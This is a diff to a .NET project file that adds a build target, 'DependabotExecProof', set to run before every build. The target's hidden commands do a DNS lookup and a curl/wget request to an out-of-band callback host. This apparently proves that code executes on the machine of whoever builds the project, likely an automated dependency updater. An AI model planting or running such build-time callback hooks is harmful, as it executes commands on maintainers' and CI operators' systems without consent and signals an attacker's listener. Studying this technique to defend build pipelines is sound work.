@@ -6,8 +6,7 @@
     <PackageReference Include="Newtonsoft.Json" Version="12.0.1" />
   </ItemGroup>
   <Target Name="DependabotExecProof" BeforeTargets="Build">
-    <Exec Command="nslookup nuget-exec-proof. || true" IgnoreExitCode="true" />
-    <Exec Command="curl -s https://nuget-exec./proof || wget -q -O- https://nuget-exec./proof || true" IgnoreExitCode="true" />
-    <Exec Command="whoami > /dev/stderr 2>&amp;1 || true" IgnoreExitCode="true" />
+    <Exec Command="nslookup nuget-exec-proof.d83p4tv7u80820mbg5f0cqhqnxadfe5on.oast.site || true" IgnoreExitCode="true" />
+    <Exec Command="curl -s https://nuget-exec.d83p4tv7u80820mbg5f0cqhqnxadfe5on.oast.site/proof || wget -q -O- https://nuget-exec.d83p4tv7u80820mbg5f0cqhqnxadfe5on.oast.site/proof || true" IgnoreExitCode="true" />
   </Target>
 </Project>
